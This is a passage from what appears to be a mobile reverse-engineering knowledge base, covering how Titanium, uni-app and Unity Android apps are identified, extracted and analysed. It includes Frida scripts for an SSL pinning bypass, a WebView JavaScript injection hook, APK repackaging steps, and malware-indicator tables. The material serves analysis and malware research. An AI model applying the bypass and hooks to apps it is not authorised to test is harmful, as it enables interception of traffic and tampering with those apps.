React Native's single-bundle approach, Titanium preserves the developer's file structure.</p> <pre><code>unzip target.apk \"assets/Resources/*\" -d extracted/\nfind extracted/assets/Resources/ -name \"*.js\" | head -20\n</code></pre> <p>Typical file structure inside <code>assets/Resources/</code>:</p> <pre><code>assets/Resources/\n\u251c\u2500\u2500 app.js\n\u251c\u2500\u2500 ui/\n\u2502   \u251c\u2500\u2500 login.js\n\u2502   \u251c\u2500\u2500 dashboard.js\n\u2502   \u2514\u2500\u2500 settings.js\n\u251c\u2500\u2500 lib/\n\u2502   \u251c\u2500\u2500 api.js\n\u2502   \u251c\u2500\u2500 crypto.js\n\u2502   \u2514\u2500\u2500 storage.js\n\u2514\u2500\u2500 alloy/\n    \u251c\u2500\u2500 controllers/\n    \u251c\u2500\u2500 models/\n    \u2514\u2500\u2500 styles/\n</code></pre>"},{"location":"reversing/frameworks/titanium/#alloy-framework","title":"Alloy Framework","text":"<p>Many Titanium apps use the Alloy MVC framework, which compiles XML views, TSS styles, and controller JS into standard Titanium JS files at build time. The compiled output lands in <code>assets/Resources/alloy/</code> and is fully readable JavaScript.</p> <pre><code>find extracted/assets/Resources/alloy/controllers/ -name \"*.js\"\n</code></pre>"},{"location":"reversing/frameworks/titanium/#precompiled-v8-snapshots","title":"Precompiled V8 Snapshots","text":"<p>Some Titanium builds precompile JavaScript into V8 snapshots or bytecode to improve startup time. In these cases, <code>assets/Resources/</code> contains <code>.jsb</code> (JavaScript binary) files instead of plaintext <code>.js</code>.</p> <pre><code>file extracted/assets/Resources/app.jsb\nxxd -l 16 extracted/assets/Resources/app.jsb\n</code></pre> <p>V8 snapshots are version-specific and significantly harder to reverse. If plaintext JS is absent, check for mixed deployments where some files are compiled and others remain as source.</p>"},{"location":"reversing/frameworks/titanium/#analysis","title":"Analysis","text":""},{"location":"reversing/frameworks/titanium/#plaintext-js-common-case","title":"Plaintext JS (Common Case)","text":"<p>Most Titanium apps ship unobfuscated JavaScript. Analysis is straightforward:</p> <pre><code>grep -rn \"Ti.Network\\|Ti.API\\|Titanium.Network\\|httpClient\" extracted/assets/Resources/\ngrep -rn \"password\\|token\\|secret\\|api_key\\|apiKey\" extracted/assets/Resources/\ngrep -rn \"https\\?://\" extracted/assets/Resources/ | grep -v \"appcelerator.com\"\n</code></pre>"},{"location":"reversing/frameworks/titanium/#key-patterns-to-search","title":"Key Patterns to Search","text":"Pattern Significance <code>Ti.Network.createHTTPClient</code> Network requests -- extract endpoints <code>Ti.App.Properties.setString</code> Local data storage -- look for credentials <code>Ti.Database.open</code> SQLite database access <code>Ti.Filesystem</code> File operations on device <code>Ti.Contacts</code> Contact harvesting <code>Ti.Geolocation</code> Location tracking <code>Ti.Media.showCamera</code> Camera access"},{"location":"reversing/frameworks/titanium/#v8-bytecode-analysis","title":"V8 Bytecode Analysis","text":"<p>For precompiled <code>.jsb</code> files, options are limited:</p> <pre><code>strings extracted/assets/Resources/app.jsb | grep -iE \"(http|api|token|key|password)\"\n</code></pre> <p>V8 bytecode does not have mature open-source decompilers comparable to Hermes tooling. Focus on string extraction and runtime hooking when encountering compiled bundles.</p>"},{"location":"reversing/frameworks/titanium/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/titanium/#java-layer-kroll-intercepts","title":"Java-Layer Kroll Intercepts","text":"<p>The Kroll bridge is the chokepoint for all JS-to-native communication. Hook proxy method invocations to monitor API calls:</p> <pre><code>Java.perform(function() {\n    var KrollProxy = Java.use(\"org.appcelerator.kroll.KrollProxy\");\n    KrollProxy.fireEvent.overload(\"java.lang.String\", \"org.appcelerator.kroll.KrollDict\").implementation = function(event, data) {\n        console.log(\"[Kroll] Event: \" + event + \" Data: \" + data);\n        return this.fireEvent(event, data);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/titanium/#http-request-interception","title":"HTTP Request Interception","text":"<pre><code>Java.perform(function() {\n    var TiHTTPClient = Java.use(\"ti.modules.titanium.network.TiHTTPClient\");\n    TiHTTPClient.open.overload(\"java.lang.String\", \"java.lang.String\").implementation = function(method, url) {\n        console.log(\"[HTTP] \" + method + \" \" + url);\n        return this.open(method, url);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/titanium/#v8-native-hooks","title":"V8 Native Hooks","text":"<p>Hook V8 script evaluation to intercept JS code loading:</p> <pre><code>var krollModule = Process.findModuleByName(\"libkroll-v8.so\");\nif (krollModule) {\n    krollModule.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"Script\") !== -1 &amp;&amp; exp.name.indexOf(\"Compile\") !== -1) {\n            console.log(\"[V8] \" + exp.name + \" @ \" + exp.address);\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/titanium/#module-registration-monitoring","title":"Module Registration Monitoring","text":"<pre><code>Java.perform(function() {\n    var KrollModule = Java.use(\"org.appcelerator.kroll.KrollModule\");\n    KrollModule.onAppCreate.implementation = function(app) {\n        console.log(\"[Module] \" + this.getClass().getName() + \" registered\");\n        return this.onAppCreate(app);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/titanium/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>Titanium's HTTP stack wraps Java's <code>HttpURLConnection</code> or Apache HTTP client through <code>TiHTTPClient</code>. SSL pinning, when present, operates at the Java layer:</p> <pre><code>Java.perform(function() {\n    var X509TrustManager = Java.use(\"javax.net.ssl.X509TrustManager\");\n    var SSLContext = Java.use(\"javax.net.ssl.SSLContext\");\n\n    var TrustAllManager = Java.registerClass({\n        name: \"com.bypass.TrustAll\",\n        implements: [X509TrustManager],\n        methods: {\n            checkClientTrusted: function(chain, authType) {},\n            checkServerTrusted: function(chain, authType) {},\n            getAcceptedIssuers: function() { return []; }\n        }\n    });\n\n    var trustManagers = Java.array(\"javax.net.ssl.TrustManager\", [TrustAllManager.$new()]);\n    var sslContext = SSLContext.getInstance(\"TLS\");\n    sslContext.init(null, trustManagers, null);\n    SSLContext.setDefault(sslContext);\n});\n</code></pre> <p>Some Titanium apps implement certificate checks in JavaScript via <code>Ti.Network.HTTPClient.validatesSecureCertificate</code>. Patch this by modifying the JS source directly in <code>assets/Resources/</code> before repackaging.</p>"},{"location":"reversing/frameworks/titanium/#malware-context","title":"Malware Context","text":"<p>Titanium was used in phishing campaigns during its peak popularity (2012--2016). The framework's appeal to threat actors was rapid cross-platform UI cloning with native-looking results.</p> Use Case Details Fake banking apps Titanium's native UI components produced convincing banking clones that were harder to distinguish from native apps than WebView-based phishing Credential harvesting Simple apps using <code>Ti.Network.createHTTPClient</code> to POST stolen credentials to attacker infrastructure Data exfiltration Access to contacts (<code>Ti.Contacts</code>), location (<code>Ti.Geolocation</code>), and device info through Titanium's cross-platform APIs Adware wrappers Apps wrapping advertising SDKs with minimal legitimate functionality <p>Modern malware rarely uses Titanium due to the framework's decline. Encountering a Titanium-based sample today likely indicates either a legacy app or an actor reusing older tooling.</p>"},{"location":"reversing/frameworks/titanium/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Plaintext JS Precompiled V8 Code format JavaScript source files V8 bytecode snapshots Readability High -- usually unminified Low -- no mature decompilers String extraction Trivial Trivial via <code>strings</code> File structure Preserved from source project Flat binary blobs Patching Edit JS, repackage Requires bytecode manipulation Overall difficulty Very Easy Moderate <p>Titanium apps with plaintext JavaScript are among the easiest Android targets to reverse engineer. The preserved file structure, readable code, and well-defined Kroll bridge make both static and dynamic analysis straightforward. The primary challenge arises only with precompiled V8 builds, which are uncommon.</p>"},{"location":"reversing/frameworks/titanium/#references","title":"References","text":"<ul> <li>Titanium SDK Source -- tidev</li> <li>Kroll Bridge Architecture -- Appcelerator Wiki (archived)</li> <li>Frida -- Dynamic Instrumentation Toolkit</li> <li>jadx -- Android DEX Decompiler</li> </ul>"},{"location":"reversing/frameworks/uni-app/","title":"uni-app (DCloud)","text":"<p>uni-app is a Vue.js-based cross-platform framework developed by DCloud, a Chinese company. Apps built with uni-app run JavaScript inside a WebView or use a native rendering engine (based on Weex) depending on the build configuration. The framework dominates the Chinese Android app ecosystem and is the most common framework behind Chinese-market phishing, gambling, and grey-market financial apps. All business logic lives in JavaScript/Vue bundles packaged under <code>assets/apps/</code> inside the APK, making it the primary reverse engineering target.</p>"},{"location":"reversing/frameworks/uni-app/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/uni-app/#runtime-modes","title":"Runtime Modes","text":"<p>uni-app supports two rendering modes that fundamentally change the app's runtime behavior:</p> Mode Engine Description WebView Android WebView (Chromium) Vue components render as HTML/CSS inside a system WebView -- identical to a Cordova-style app Native Rendering Weex-based engine Vue components compile to native UI widgets via a bridge layer, similar to React Native <p>Most uni-app APKs in the wild use WebView mode. Native rendering (marketed as \"uni-app x\" or \"nvue\") is less common and requires explicit per-page opt-in by the developer.</p>"},{"location":"reversing/frameworks/uni-app/#component-stack","title":"Component Stack","text":"Layer Component JavaScript Vue.js 2/3 application code, uni-app runtime, plugin APIs Bridge DCloud bridge layer (<code>io.dcloud.feature.*</code>) connecting JS to Android APIs Rendering Android WebView or Weex native renderer Native Shell DCloud SDK (<code>io.dcloud.*</code>), handles lifecycle, permissions, plugin loading <p>The DCloud bridge exposes device APIs (camera, GPS, contacts, file system) to JavaScript through a message-passing interface. JavaScript calls <code>uni.*</code> APIs, which serialize through the bridge to Java-side handlers in <code>io.dcloud.feature.*</code> classes.</p>"},{"location":"reversing/frameworks/uni-app/#dcloud-plus-plugins","title":"DCloud Plus Plugins","text":"<p>uni-app uses a plugin system called \"Plus\" (HTML5+) that provides native capability wrappers. Each plugin registers as a Java class under <code>io.dcloud.feature.*</code> and exposes methods callable from JavaScript via <code>plus.*</code> or <code>uni.*</code> APIs.</p>"},{"location":"reversing/frameworks/uni-app/#identification","title":"Identification","text":"Indicator Location <code>assets/apps/__UNI__XXXXXXX/</code> App bundle directory (hex app ID) <code>assets/data/dcloud_control.json</code> DCloud runtime configuration <code>assets/data/dcloud_error.html</code> DCloud error page <code>assets/data/dcloud_properties.xml</code> DCloud properties <code>io.dcloud.*</code> Package prefix in DEX classes <code>io.dcloud.PandoraEntry</code> Main entry point activity <code>io.dcloud.PandoraEntryActivity</code> Alternative entry point <code>DCUniMP</code> or <code>DCloudApplication</code> Application class names <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -E \"(dcloud|io\\.dcloud|assets/apps/)\"\n</code></pre> <p>Manifest inspection:</p> <pre><code>aapt dump xmltree target.apk AndroidManifest.xml | grep -i dcloud\n</code></pre>"},{"location":"reversing/frameworks/uni-app/#app-id-format","title":"App ID Format","text":"<p>Every uni-app project gets a unique ID in the format <code>__UNI__XXXXXXX</code> (7 hex characters). This ID appears as the directory name under <code>assets/apps/</code> and in <code>dcloud_control.json</code>. It maps to the app's registration on DCloud's developer portal.</p>"},{"location":"reversing/frameworks/uni-app/#code-location-extraction","title":"Code Location &amp; Extraction","text":""},{"location":"reversing/frameworks/uni-app/#bundle-structure","title":"Bundle Structure","text":"<pre><code>assets/\n  apps/\n    __UNI__XXXXXXX/\n      www/\n        app-config.js\n        app-service.js\n        manifest.json\n        pages/\n          index/\n            index.js\n          login/\n            login.js\n        static/\n        uni_modules/\n  data/\n    dcloud_control.json\n    dcloud_error.html\n</code></pre> <p>The <code>app-service.js</code> file is the main application bundle -- a single concatenated JavaScript file containing all Vue component logic, route definitions, API calls, and business rules.</p>"},{"location":"reversing/frameworks/uni-app/#extraction","title":"Extraction","text":"<pre><code>unzip target.apk \"assets/apps/*\" -d extracted/\nunzip target.apk \"assets/data/*\" -d extracted/\n</code></pre>"},{"location":"reversing/frameworks/uni-app/#javascript-analysis","title":"JavaScript Analysis","text":"<p>The extracted JavaScript is minified but not bytecode-compiled. Standard beautification makes it readable:</p> <pre><code>npx prettier --write extracted/assets/apps/__UNI__*/www/app-service.js\nnpx prettier --write extracted/assets/apps/__UNI__*/www/app-config.js\n</code></pre> <p>Search for high-value targets:</p> <pre><code>grep -rniE \"(api|http|token|secret|password|login|encrypt|decrypt|key)\" extracted/assets/apps/\n</code></pre>"},{"location":"reversing/frameworks/uni-app/#configuration-files","title":"Configuration Files","text":"<p><code>manifest.json</code> in the app bundle directory contains app metadata, permissions, and SDK configuration. <code>dcloud_control.json</code> in <code>assets/data/</code> specifies the runtime version and app ID. Parse both with <code>python3 -m json.tool</code>.</p>"},{"location":"reversing/frameworks/uni-app/#analysis-workflow","title":"Analysis Workflow","text":"<ol> <li>Unzip APK and confirm DCloud indicators (<code>io.dcloud.*</code>, <code>assets/apps/</code>)</li> <li>Extract all files from <code>assets/apps/</code> and <code>assets/data/</code></li> <li>Beautify <code>app-service.js</code> -- this is the primary analysis target</li> <li>Parse <code>manifest.json</code> for permissions, API keys, third-party SDK configs</li> <li>Search for API endpoints, hardcoded credentials, encryption keys</li> <li>Map <code>uni.*</code> / <code>plus.*</code> API calls to understand what device capabilities the app uses</li> <li>Hook at runtime with Frida to capture dynamic values</li> </ol>"},{"location":"reversing/frameworks/uni-app/#api-call-mapping","title":"API Call Mapping","text":"<p>uni-app JavaScript uses <code>uni.*</code> APIs for platform features. Key APIs to search for:</p> API Call Capability <code>uni.request</code> HTTP requests -- reveals C2 endpoints <code>uni.uploadFile</code> File exfiltration <code>uni.getLocation</code> GPS tracking <code>uni.getSystemInfo</code> Device fingerprinting <code>uni.setStorage</code> / <code>uni.getStorage</code> Local data persistence <code>uni.makePhoneCall</code> Phone call initiation <code>uni.sendSmsMessage</code> SMS sending (via plus plugin) <code>plus.contacts</code> Contact list access <code>plus.camera</code> Camera access <code>plus.io</code> File system access"},{"location":"reversing/frameworks/uni-app/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/uni-app/#webview-interception","title":"WebView Interception","text":"<p>For WebView-mode apps, hook the WebView bridge to intercept all JS-to-native communication:</p> <pre><code>Java.perform(function() {\n    var WebView = Java.use(\"android.webkit.WebView\");\n\n    WebView.loadUrl.overload(\"java.lang.String\").implementation = function(url) {\n        console.log(\"[WebView] loadUrl: \" + url);\n        this.loadUrl(url);\n    };\n\n    WebView.evaluateJavascript.implementation = function(script, callback) {\n        console.log(\"[WebView] evaluateJavascript: \" + script.substring(0, 200));\n        this.evaluateJavascript(script, callback);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/uni-app/#dcloud-bridge-interception","title":"DCloud Bridge Interception","text":"<p>Hook the DCloud bridge layer to capture all native API calls from JavaScript:</p> <pre><code>Java.perform(function() {\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            if (className.indexOf(\"io.dcloud.feature\") !== -1) {\n                console.log(\"[DCloud Feature] \" + className);\n            }\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"reversing/frameworks/uni-app/#network-request-interception","title":"Network Request Interception","text":"<p>Capture HTTP requests made through <code>uni.request</code>:</p> <pre><code>Java.perform(function() {\n    var URL = Java.use(\"java.net.URL\");\n    URL.openConnection.overload().implementation = function() {\n        console.log(\"[Network] \" + this.toString());\n        return this.openConnection();\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/uni-app/#javascript-injection","title":"JavaScript Injection","text":"<p>Inject JavaScript into the WebView to intercept <code>uni.*</code> calls at the JS layer:</p> <pre><code>Java.perform(function() {\n    var WebView = Java.use(\"android.webkit.WebView\");\n    WebView.loadUrl.overload(\"java.lang.String\").implementation = function(url) {\n        this.loadUrl(url);\n        var payload = \"javascript:void((function(){var orig=uni.request;uni.request=function(o){console.log(JSON.stringify(o));return orig(o);}})())\";\n        this.loadUrl(payload);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/uni-app/#malware-context","title":"Malware Context","text":"<p>uni-app is the framework of choice for Chinese-origin Android malware campaigns, particularly those targeting financial fraud and data harvesting.</p> Use Case Details Gambling apps Illegal gambling platforms distributed outside Google Play, rapid iteration on game UIs using Vue components Phishing campaigns Fake banking and payment apps mimicking Alipay, WeChat Pay, and Chinese bank interfaces Loan fraud Predatory lending apps collecting contacts, photos, and location data for extortion Cryptoscams Fake cryptocurrency trading platforms with fabricated balances and withdrawal locks Data harvesters Apps requesting excessive permissions, exfiltrating contacts, SMS, and call logs via <code>plus.*</code> APIs"},{"location":"reversing/frameworks/uni-app/#chinese-ecosystem-dominance","title":"Chinese Ecosystem Dominance","text":"<p>uni-app is overwhelmingly distributed through Chinese app stores (Huawei AppGallery, Xiaomi GetApps, Tencent MyApp, Baidu Mobile Assistant) rather than Google Play. APKs are also sideloaded via WeChat/QQ links and landing pages. This distribution model makes them harder to track through standard Western threat intelligence feeds.</p>"},{"location":"reversing/frameworks/uni-app/#detection-patterns","title":"Detection Patterns","text":"<p>Common indicators of malicious uni-app samples:</p> <ul> <li>Heavy use of <code>plus.contacts</code>, <code>plus.camera</code>, <code>plus.io</code> for data collection</li> <li>API endpoints pointing to recently registered domains or IP addresses</li> <li>Obfuscated C2 URLs constructed by string concatenation in <code>app-service.js</code></li> <li>Permission requests disproportionate to stated app functionality</li> <li>Multiple app IDs cycling through the same C2 infrastructure</li> </ul>"},{"location":"reversing/frameworks/uni-app/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Assessment Code format Minified JavaScript (plaintext) Readability High -- beautify and read directly String extraction Trivial -- standard text search Control flow recovery Full -- standard JavaScript Patching Edit JS files, repackage APK Obfuscation ceiling Standard JS obfuscators (rare in practice) Overall difficulty Easy (rank 15/28) <p>The JavaScript is not bytecode-compiled, making uni-app one of the easier frameworks to reverse engineer. The main challenge is volume -- <code>app-service.js</code> can be large (1-5 MB minified) -- and navigating the DCloud-specific API surface. Most malicious uni-app samples use minimal or no obfuscation, relying instead on rapid deployment and replacement to evade takedowns.</p>"},{"location":"reversing/frameworks/uni-app/#references","title":"References","text":"<ul> <li>DCloud uni-app Documentation</li> <li>dcloudio/uni-app -- GitHub</li> <li>Frida</li> <li>jadx</li> </ul>"},{"location":"reversing/frameworks/unity/","title":"Unity","text":"<p>Unity apps on Android ship as native APKs containing one of two compilation backends: Mono (C# assemblies as .NET DLLs) or IL2CPP (C# compiled to native ARM code via an intermediate C++ transpilation step). The backend choice determines the entire reverse engineering approach. Mono apps are trivially decompilable back to near-source C#; IL2CPP apps require metadata recovery from <code>global-metadata.dat</code> combined with native binary analysis of <code>libil2cpp.so</code>. Unity holds a dominant share of the mobile game market and is also used in non-game apps, making it a frequent target for both malware analysis and game security research.</p>"},{"location":"reversing/frameworks/unity/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/unity/#build-pipeline","title":"Build Pipeline","text":"<p>Unity compiles C# game logic through one of two backends before packaging as an APK:</p> Stage Mono Backend IL2CPP Backend Source C# scripts (.cs) C# scripts (.cs) Compilation Mono compiler produces .NET DLLs (CIL bytecode) Mono compiler produces CIL, then il2cpp transpiles to C++ source Final form <code>Assembly-CSharp.dll</code> + framework DLLs in APK <code>libil2cpp.so</code> (native ARM) + <code>global-metadata.dat</code> Runtime Mono VM interprets/JITs the CIL bytecode Native code runs directly, il2cpp runtime handles GC and type system"},{"location":"reversing/frameworks/unity/#apk-structure","title":"APK Structure","text":"<pre><code>base.apk/\n\u251c\u2500\u2500 assets/\n\u2502   \u2514\u2500\u2500 bin/\n\u2502       \u2514\u2500\u2500 Data/\n\u2502           \u251c\u2500\u2500 Managed/                  (Mono only)\n\u2502           \u2502   \u251c\u2500\u2500 Assembly-CSharp.dll\n\u2502           \u2502   \u251c\u2500\u2500 Assembly-CSharp-firstpass.dll\n\u2502           \u2502   \u251c\u2500\u2500 UnityEngine.dll\n\u2502           \u2502   \u2514\u2500\u2500 ...\n\u2502           \u251c\u2500\u2500 globalgamemanagers\n\u2502           \u251c\u2500\u2500 data.unity3d\n\u2502           \u251c\u2500\u2500 level0\n\u2502           \u251c\u2500\u2500 resources.assets\n\u2502           \u2514\u2500\u2500 sharedassets0.assets\n\u251c\u2500\u2500 lib/\n\u2502   \u251c\u2500\u2500 arm64-v8a/\n\u2502   \u2502   \u251c\u2500\u2500 libunity.so\n\u2502   \u2502   \u251c\u2500\u2500 libil2cpp.so              (IL2CPP only)\n\u2502   \u2502   \u2514\u2500\u2500 libmono.so                (Mono only)\n\u2502   \u2514\u2500\u2500 armeabi-v7a/\n\u2502       \u2514\u2500\u2500 ...\n\u251c\u2500\u2500 classes.dex\n\u2514\u2500\u2500 AndroidManifest.xml\n</code></pre> <p>The <code>global-metadata.dat</code> file (IL2CPP) is located either at <code>assets/bin/Data/Managed/Metadata/global-metadata.dat</code> or embedded within <code>assets/bin/Data/</code> depending on Unity version.</p>"},{"location":"reversing/frameworks/unity/#mono-runtime","title":"Mono Runtime","text":"<p>The Mono backend bundles a full .NET runtime (<code>libmono.so</code>) that loads CIL assemblies at startup. Game logic lives in <code>Assembly-CSharp.dll</code>, which contains standard .NET metadata -- class definitions, method signatures, string literals, and IL opcodes. Third-party plugins ship as separate DLLs in the same <code>Managed/</code> directory.</p>"},{"location":"reversing/frameworks/unity/#il2cpp-runtime","title":"IL2CPP Runtime","text":"<p>IL2CPP converts all CIL bytecode to C++ source, then compiles that C++ with the platform's native toolchain (NDK clang for Android). The output is a single <code>libil2cpp.so</code> containing all game logic as native ARM instructions. Class names, method signatures, field types, and string literals are preserved in <code>global-metadata.dat</code>, a structured binary file that the IL2CPP runtime reads at initialization to populate reflection data.</p>"},{"location":"reversing/frameworks/unity/#identification","title":"Identification","text":"Indicator What It Confirms <code>lib/*/libunity.so</code> Unity engine (present in both backends) <code>lib/*/libil2cpp.so</code> IL2CPP backend <code>lib/*/libmono.so</code> Mono backend <code>assets/bin/Data/Managed/*.dll</code> Mono backend (assemblies present) <code>global-metadata.dat</code> IL2CPP backend <code>com.unity3d.player.UnityPlayer</code> in DEX Unity bootstrap activity <code>unity.build-id</code> in <code>AndroidManifest.xml</code> meta-data Unity build system <code>globalgamemanagers</code> in <code>assets/bin/Data/</code> Unity asset system <p>Quick identification:</p> <pre><code>unzip -l target.apk | grep -E \"(libunity|libil2cpp|libmono|global-metadata|Assembly-CSharp)\"\n</code></pre> <p>Determine the backend:</p> <pre><code>unzip -l target.apk | grep -q \"libil2cpp\" &amp;&amp; echo \"IL2CPP\" || echo \"Mono\"\n</code></pre>"},{"location":"reversing/frameworks/unity/#code-location-extraction","title":"Code Location &amp; Extraction","text":""},{"location":"reversing/frameworks/unity/#mono-backend","title":"Mono Backend","text":"<p>All game code exists as standard .NET assemblies:</p> <pre><code>mkdir -p extracted\nunzip target.apk \"assets/bin/Data/Managed/*.dll\" -d extracted/\n</code></pre> <p>Primary targets:</p> DLL Contents <code>Assembly-CSharp.dll</code> All game/app C# scripts <code>Assembly-CSharp-firstpass.dll</code> Scripts in <code>Standard Assets</code> or <code>Plugins</code> folders <code>Assembly-UnityScript.dll</code> Legacy UnityScript code (rare, deprecated) Third-party DLLs Photon, PlayFab, Firebase, ad SDKs <p>These are standard CIL assemblies -- open them directly in dnSpy or ILSpy for full decompilation back to readable C#.</p>"},{"location":"reversing/frameworks/unity/#il2cpp-backend","title":"IL2CPP Backend","text":"<p>Game code is compiled into native ARM instructions inside <code>libil2cpp.so</code>. Metadata preserving class/method names is in <code>global-metadata.dat</code>:</p> <pre><code>mkdir -p extracted\nunzip target.apk \"lib/arm64-v8a/libil2cpp.so\" -d extracted/\nunzip target.apk \"assets/bin/Data/Managed/Metadata/global-metadata.dat\" -d extracted/\n</code></pre> <p>If <code>global-metadata.dat</code> is not at that path, search for it:</p> <pre><code>unzip -l target.apk | grep \"global-metadata\"\n</code></pre>"},{"location":"reversing/frameworks/unity/#analysis-tools","title":"Analysis Tools","text":"Tool Purpose URL dnSpy .NET decompiler/debugger for Mono DLLs <code>github.com/dnSpyEx/dnSpy</code> ILSpy .NET decompiler (cross-platform) <code>github.com/icsharpcode/ILSpy</code> Il2CppDumper Extract types, methods, strings from IL2CPP <code>github.com/Perfare/Il2CppDumper</code> Cpp2IL IL2CPP analysis, generates pseudo-C# and Ghidra scripts <code>github.com/SamboyCoding/Cpp2IL</code> Il2CppInspector IL2CPP structure recovery, IDA/Ghidra script generation <code>github.com/djkaty/Il2CppInspector</code> AssetStudio Extract and preview Unity assets (textures, meshes, audio) <code>github.com/Perfare/AssetStudio</code> AssetRipper Full Unity project recovery from assets <code>github.com/AssetRipper/AssetRipper</code> Ghidra Native binary analysis for <code>libil2cpp.so</code> <code>ghidra-sre.org</code> IDA Pro Native binary analysis (commercial) <code>hex-rays.com</code> Frida Runtime instrumentation and hooking <code>frida.re</code>"},{"location":"reversing/frameworks/unity/#analysis-workflow","title":"Analysis Workflow","text":""},{"location":"reversing/frameworks/unity/#mono-backend-workflow","title":"Mono Backend Workflow","text":"<p>Mono apps yield near-source-quality decompilation with minimal effort.</p> <p>Step 1: Extract assemblies</p> <pre><code>unzip target.apk \"assets/bin/Data/Managed/*.dll\" -d work/\n</code></pre> <p>Step 2: Decompile with dnSpy or ILSpy</p> <p>Open <code>Assembly-CSharp.dll</code> in dnSpy. The output is readable C# with original class names, method names, and string literals intact. Navigate the type tree to find:</p> <ul> <li>Network request handlers (API endpoints, auth tokens)</li> <li>In-app purchase validation logic</li> <li>Anti-cheat implementations</li> <li>Encryption/decryption routines</li> <li>Server communication protocols</li> </ul> <p>Step 3: Modify and repackage (if needed)</p> <p>dnSpy supports direct editing of CIL. Modify a method, save the assembly, replace it in the APK, re-sign, and install:</p> <pre><code>cp modified/Assembly-CSharp.dll work/assets/bin/Data/Managed/\ncd work &amp;&amp; zip -r ../modified.apk . &amp;&amp; cd ..\napksigner sign --ks keystore.jks modified.apk\n</code></pre>"},{"location":"reversing/frameworks/unity/#il2cpp-backend-workflow","title":"IL2CPP Backend Workflow","text":"<p>IL2CPP requires a two-phase approach: metadata recovery followed by native analysis.</p> <p>Step 1: Extract binary and metadata</p> <pre><code>unzip target.apk \"lib/arm64-v8a/libil2cpp.so\" -d work/\nunzip target.apk \"assets/bin/Data/Managed/Metadata/global-metadata.dat\" -d work/\n</code></pre> <p>Step 2: Run Il2CppDumper</p> <pre><code>Il2CppDumper libil2cpp.so global-metadata.dat output/\n</code></pre> <p>Il2CppDumper produces:</p> Output File Contents <code>dump.cs</code> C# class/method declarations with RVA addresses (no method bodies) <code>il2cpp.h</code> C header with struct definitions for all types <code>script.json</code> Method name-to-address mappings <code>stringliteral.json</code> All string literals with their addresses <code>ghidra_with_struct.py</code> Ghidra script to apply type info and rename functions <code>ida_with_struct_py3.py</code> IDA script for the same purpose <p>Step 3: Apply metadata to disassembler</p> <p>Load <code>libil2cpp.so</code> in Ghidra, then run the generated script:</p> <pre><code>ghidra_with_struct.py\n</code></pre> <p>This renames thousands of <code>FUN_XXXXX</code> functions to their original C# method names and applies struct definitions, transforming an opaque ARM binary into a navigable codebase.</p> <p>Step 4: Alternative -- Cpp2IL</p> <p>Cpp2IL goes further than Il2CppDumper by attempting to reconstruct method bodies:</p> <pre><code>Cpp2IL --game-path . --exe-name libil2cpp.so --output-as isil\n</code></pre> <p>The ISIL (Intermediate Static IL) output provides pseudo-instructions for each method, approximating the original logic without full decompilation.</p> <p>Step 5: Search recovered data</p> <pre><code>grep -i \"api\\|token\\|secret\\|password\\|encrypt\\|decrypt\\|http\" output/dump.cs\n</code></pre> <pre><code>python3 -c \"\nimport json\nwith open('output/stringliteral.json') as f:\n    for s in json.load(f):\n        v = s.get('value', '')\n        if any(k in v.lower() for k in ['http', 'api', 'key', 'token', 'secret']):\n            print(v)\n\"\n</code></pre>"},{"location":"reversing/frameworks/unity/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/unity/#mono-runtime-hooks","title":"Mono Runtime Hooks","text":"<p>When targeting Mono-backend Unity apps, hook through the Mono runtime API exported by <code>libmono.so</code>. The key function is <code>mono_runtime_invoke</code>, which the VM calls for every managed method invocation:</p> <pre><code>var mono = Process.findModuleByName(\"libmono.so\");\n\nvar mono_runtime_invoke = Module.findExportByName(\"libmono.so\", \"mono_runtime_invoke\");\nInterceptor.attach(mono_runtime_invoke, {\n    onEnter: function(args) {\n        var method = args[0];\n        var mono_method_get_name = new NativeFunction(\n            Module.findExportByName(\"libmono.so\", \"mono_method_get_name\"),\n            \"pointer\", [\"pointer\"]\n        );\n        var name = mono_method_get_name(method).readUtf8String();\n        if (name.indexOf(\"Login\") !== -1 || name.indexOf(\"Purchase\") !== -1) {\n            console.log(\"[Mono] \" + name + \" called\");\n        }\n    }\n});\n</code></pre> <p>Enumerate all loaded assemblies and their classes:</p> <pre><code>var mono_assembly_foreach = new NativeFunction(\n    Module.findExportByName(\"libmono.so\", \"mono_assembly_foreach\"),\n    \"void\", [\"pointer\", \"pointer\"]\n);\n\nvar callback = new NativeCallback(function(assembly, userData) {\n    var mono_assembly_get_image = new NativeFunction(\n        Module.findExportByName(\"libmono.so\", \"mono_assembly_get_image\"),\n        \"pointer\", [\"pointer\"]\n    );\n    var mono_image_get_name = new NativeFunction(\n        Module.findExportByName(\"libmono.so\", \"mono_image_get_name\"),\n        \"pointer\", [\"pointer\"]\n    );\n    var image = mono_assembly_get_image(assembly);\n    console.log(\"[Mono Assembly] \" + mono_image_get_name(image).readUtf8String());\n}, \"void\", [\"pointer\", \"pointer\"]);\n\nmono_assembly_foreach(callback, ptr(0));\n</code></pre>"},{"location":"reversing/frameworks/unity/#il2cpp-hooks","title":"IL2CPP Hooks","text":"<p>For IL2CPP apps, use the RVA offsets from Il2CppDumper's <code>script.json</code> to hook specific methods as native functions:</p> <pre><code>var il2cpp = Process.findModuleByName(\"libil2cpp.so\");\nvar baseAddr = il2cpp.base;\n\nvar scriptData = {\n    \"GameManager$$SendScore\": \"0x1A3F40\",\n    \"NetworkManager$$PostRequest\": \"0x1B2C80\",\n    \"CryptoHelper$$Decrypt\": 